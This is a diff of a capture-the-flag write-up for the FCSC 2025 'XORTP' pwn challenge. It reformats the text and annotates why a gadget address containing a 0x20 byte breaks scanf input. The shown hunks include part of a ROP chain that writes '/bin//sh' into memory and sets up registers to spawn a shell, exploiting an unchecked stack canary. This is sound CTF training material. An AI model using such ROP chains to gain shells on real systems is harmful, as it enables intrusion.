@@ -1,10 +1,8 @@
 # XORTP
 
----
-
 **Link:** [https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-xortp/](https://hackropole.fr/fr/challenges/pwn/fcsc2025-pwn-xortp/)
 
-**Category:** pwn
+**Category:** ![](https://img.shields.io/badge/pwn-3776AB)
 
 **Difficulty:** ⭐
 
@@ -66,7 +64,7 @@ This means:
 
 - **NX is enabled**, so the stack is non-executable and shellcode injection is not possible.
 - The binary is **not PIE**, so addresses are fixed.
-- A **stack canary is present**, but by analyzing the disassembly code, we find that the canary is not checked in the `main()` function**.**
+- A **stack canary is present**, but by analyzing the disassembly code, we find that the canary is not checked in the `main()` function.
 
 Therefore, a ROP chain is possible.
 
@@ -104,7 +102,7 @@ p += b'/bin//sh'
 p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
 p += pack('<Q', 0x000000000040f972) # pop rsi ; ret
 p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
-p += pack('<Q', 0x0000000000434a**20**) # xor rax, rax ; ret
+p += pack('<Q', 0x0000000000434a20) # xor rax, rax ; ret                <---- presence of the 0x20 byte
 p += pack('<Q', 0x0000000000445371) # mov qword ptr [rsi], rax ; ret
 p += pack('<Q', 0x0000000000401f60) # pop rdi ; ret
 p += pack('<Q', 0x00000000004c40e0) # @ .data
@@ -113,7 +111,7 @@ p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
 p += pack('<Q', 0x00000000004867a7) # pop rdx ; pop rbx ; ret
 p += pack('<Q', 0x00000000004c40e8) # @ .data + 8
 p += pack('<Q', 0x4141414141414141) # padding
-p += pack('<Q', 0x0000000000434a**20**) # xor rax, rax ; ret
+p += pack('<Q', 0x0000000000434a20) # xor rax, rax ; ret                <---- presence of the 0x20 byte
 ```
 
 Since `scanf("%s")` stops reading at **space**, **\n**, or **\t**, everything after that was ignored. This gadget is used twice. We confirmed the issue by printing the content of the payload.
